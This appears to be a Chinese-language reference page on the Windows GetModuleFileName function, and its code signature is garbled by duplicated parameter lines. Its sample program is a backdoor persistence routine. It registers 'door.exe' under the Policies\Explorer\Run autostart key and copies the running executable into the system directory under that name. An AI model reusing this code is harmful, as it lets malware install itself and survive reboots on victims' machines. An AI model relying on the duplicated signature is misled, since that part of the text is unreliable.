GetModuleFileName函数检索指定模块的完全限定路径。

要指定包含模块的进程，请使用GetModuleFileNameEx函数。



```cpp
DWORD GetModuleFileName(
  HMODULE hModule,    // handle to module
  LPTSTR lpFilename,  // path buffer
  DWORD nSize         // size of buffer
); hModule,    // handle to module
  LPTSTR lpFilename,  // path buffer
  DWORD nSize         // size of buffer
);
```

参数

hModule:[in]请求路径的模块的句柄。如果该参数为空，GetModuleFileName将检索当前模块的路径。

lpFilename:[out]指向缓冲区的指针，该缓冲区接收模块的完全限定路径。如果字符串的长度超过了nSize参数指定的大小，则该字符串将被截断。

Windows NT/2000/XP:路径可以有前缀“\?”基于加载模块的方式。有关更多信息，请参见文件名称约定。

nSize:[in]在TCHARs中指定lpFilename缓冲区的长度。

返回值

如果函数成功，返回值是在TCHARs中复制到缓冲区的字符串的长度。如果函数失败，返回值为0。要获得扩展错误信息，请调用GetLastError。

示例代码：

```cpp
#include<stdio.h>
#include<windows.h>
int main(void)
{
	char regname[]="Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
	HKEY hkResult;
	int ret;
	ret=RegOpenKey(HKEY_CURRENT_USER,regname,&hkResult);

	ret=RegSetValueEx(hkResult,"door",0,REG_EXPAND_SZ,(unsigned char *)"%systemroot%\\door.exe",25);

	if(ret==0)
	{
		printf("success to write run key\n");
		RegCloseKey(hkResult);
	}
	else
	{
		printf("failed to open regedit.%d\n",ret);
		RegCloseKey(hkResult);
	}
	char modlepath[256];
	char syspath[256];
	GetModuleFileName(0,modlepath,256);//获取当前执行模块所在路径

	GetSystemDirectory(syspath,256);
	ret=CopyFile(modlepath,strcat(syspath,"\\door.exe"),1);
	if(ret)
		printf("%s has been copyed to sys dir %s\n",modlepath,syspath);
	else
		printf("%s is exisis",modlepath);
	return 0;
}
```

